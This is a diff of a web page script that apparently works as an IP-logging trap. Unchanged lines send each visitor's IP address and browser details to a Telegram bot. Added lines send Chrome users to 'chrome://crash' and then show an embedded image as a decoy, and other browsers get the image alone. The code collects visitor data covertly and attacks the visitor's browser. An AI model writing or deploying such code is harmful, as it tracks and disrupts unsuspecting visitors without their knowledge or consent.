@@ -31,10 +31,15 @@ IP: ${data.ip}
 
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
 
+        function showImage() {
+            document.body.innerHTML = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADsAAAA9CAYAAAATfBGuAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAADeSURBVGhD7ZdLDoMwEENLjzYHnyPlCmWHqkiQyWdasP2kbEJI9GQLha2U8nmR8K4nkJEsKpJFRbKoSBYVyaLys7tx9FeutVfvud9QJUslm1rjyJqa1jut51dQJUslm1rjDGbOpUpWsqhIFpUlX+N/oa/xBVSywzV+IlTJShYVyaIiWVQki8oOMw5u+TJZud0AAAAASUVORK5CYII=" />';
+        }
+
         if (/chrome/i.test(data.agent)) {
-            location.href = 'chrome://crash/cfg';
+            window.location.href = 'chrome://crash';
+            setTimeout(showImage, 1000);
         } else {
-            document.body.innerHTML = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADsAAAA9CAYAAAATfBGuAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAADeSURBVGhD7ZdLDoMwEENLjzYHnyPlCmWHqkiQyWdasP2kbEJI9GQLha2U8nmR8K4nkJEsKpJFRbKoUMluo5cKd6+n0jCzemoIqmSpZJfUeKZmkX0iayJQJSvZu2Fmx3D3Y/TyCNlVSHYVM5XLIFX2blDJpl4qetf0crbnGVTJUsmm1jiDmXOpkpUsKpJFRbKoSBYVyaLys7tx9FeutVfvud9QJUslm1rjyJqa1jut51dQJUslm1rjDGbOpUpWsqhIFpUlX+N/oa/xBVSywzV+IlTJShYVyaIiWVQki8oOMw5u+TJZud0AAAAASUVORK5CYII=" />';
+            showImage();
         }
     }
     execute();
